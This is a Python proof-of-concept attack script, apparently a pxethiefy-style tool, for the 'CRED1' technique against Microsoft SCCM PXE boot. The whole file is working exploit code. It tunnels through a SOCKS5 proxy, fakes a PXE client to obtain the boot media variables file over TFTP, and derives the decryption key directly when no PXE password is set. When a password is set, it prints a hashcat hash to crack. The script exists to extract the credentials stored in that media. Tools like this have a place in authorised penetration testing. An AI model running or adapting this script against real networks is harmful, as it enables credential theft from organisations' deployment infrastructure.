from lib import sccm
from lib import socks, tftp
import argparse

# Parse arguments
parser = argparse.ArgumentParser(description="SCCM CRED1 SOCKS5 POC")
parser.add_argument("target", help="SCCM PXE IP")
parser.add_argument("src_ip", help="Source IP")
parser.add_argument("socks_host", help="SOCKS5 proxy host")
parser.add_argument("socks_port", help="SOCKS5 proxy port", type=int)
parser.add_argument("-p", "--password", help="Cracked password (hex) for password-protected media file", type=str, default=None)
args = parser.parse_args()

if args.target == None or args.socks_host == None or args.socks_port == None or args.src_ip == None:
    print("Usage: python3 main.py <target> <src_ip> <socks_host> <socks_port>")
    exit()

# Setup SOCKS5 client
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

sccm_client = sccm.SCCM(args.target, 4011, client)
(variables,bcd,cryptokey) = sccm_client.send_bootp_request(args.src_ip, "11:22:33:44:55:66")

print(f"[*] Variables file: {variables}")
print(f"[*] BCD file: {bcd}")

client.close()

# Download the variables file via TFTP
client = socks.SOCKS5Client(args.socks_host, args.socks_port)
client.connect()

tftp_client = tftp.TFTPClient(args.target, 69, client)
data_variables = tftp_client.get_file(variables)

if data_variables is None:
    print("[!] TFTP download failed — file must be retrieved manually")
    print(f"[*] Download the variables file from: \\\\{args.target}\\REMINST{variables}")
    if cryptokey is not None:
        print("[*] No PXE password set (crypto key found in DHCP response)")
        decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
        if decrypt_password:
            print(f"[*] Derived key: {decrypt_password.hex()}")
            print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
    else:
        print("[*] PXE media is password-protected (no crypto key in DHCP response)")
        print("[*] Decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
    exit()

if cryptokey is None:
    # Password IS set — no crypto key in DHCP response, need to crack the hash
    print("[*] PXE media is password-protected (no crypto key in DHCP response)")
    hashcat_hash = f"$sccm$aes128${sccm_client.read_media_variable_file_header(data_variables).hex()}"

    if args.password:
        print("[*] Decrypting media file with supplied password...")
        try:
            password_bytes = bytes.fromhex(args.password)
            decrypted = sccm_client.decrypt_media_file(data_variables, password_bytes)
            print("[*] Decrypted media variables:")
            print(decrypted)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] You can also download the file manually from: \\\\{args.target}\\REMINST{variables}")
    else:
        print("[*] Hashcat hash:")
        print(hashcat_hash)
        print("[*] Crack this hash, then re-run with: -p <cracked_password_hex>")
        print(f"[*] Or download the variables file from: \\\\{args.target}\\REMINST{variables}")
        print("[*] And decrypt with: python3 pxethiefy.py decrypt -p PASSWORD -f <variables_file>")
else:
    # No password set — crypto key IS in the DHCP response, can decrypt directly
    print("[*] No PXE password set (crypto key found in DHCP response)")
    print("[*] Deriving decryption key...")
    decrypt_password = sccm_client.derive_blank_decryption_key(cryptokey)
    if decrypt_password:
        print("[*] Derived key: " + decrypt_password.hex())
        try:
            decrypted = sccm_client.decrypt_media_file(data_variables, decrypt_password)
            print("[*] Decrypted media variables:")
            print(decrypted)
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            print(f"[*] Download the variables file manually from: \\\\{args.target}\\REMINST{variables}")
            print(f"[*] Decrypt with: python3 pxethiefy.py decrypt -p {decrypt_password.hex()} -f <variables_file>")
